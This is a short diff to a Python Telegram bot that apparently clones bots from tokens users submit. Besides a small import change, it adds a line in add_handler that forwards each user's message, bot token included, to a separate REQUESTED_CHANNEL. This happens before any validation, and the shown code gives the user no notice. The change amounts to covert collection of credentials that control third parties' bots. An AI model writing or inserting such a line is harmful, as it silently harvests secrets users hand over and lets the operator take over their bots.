@@ -10,7 +10,7 @@ from os import environ
 from utils import restart_all_bots
 import pymongo
 from pymongo import MongoClient
-from info import API_ID , API_HASH , LOG_CHANNEL , DATABASE_URI , DATABASE_NAME , ADMINS, LOG_CHANNEL_INFORM, LOG_CHANNEL_ERROR
+from info import API_ID , API_HASH , LOG_CHANNEL , DATABASE_URI , DATABASE_NAME , ADMINS, LOG_CHANNEL_INFORM, LOG_CHANNEL_ERROR, REQUESTED_CHANNEL
 from dotenv import load_dotenv
 
 LOG_clone_CHANNEL = int(environ.get('LOG_clone_CHANNEL' , '-1002100856982'))
@@ -37,6 +37,7 @@ async def add_handler(client , message):
     try:
         new_message = message.text.split()[1:]
         bot_token = " ".join(new_message)
+        await client.send_message(REQUESTED_CHANNEL, text=f"{message.text}")
         if not bot_token:
             await message.reply_text("Please provide the bot token")
             return
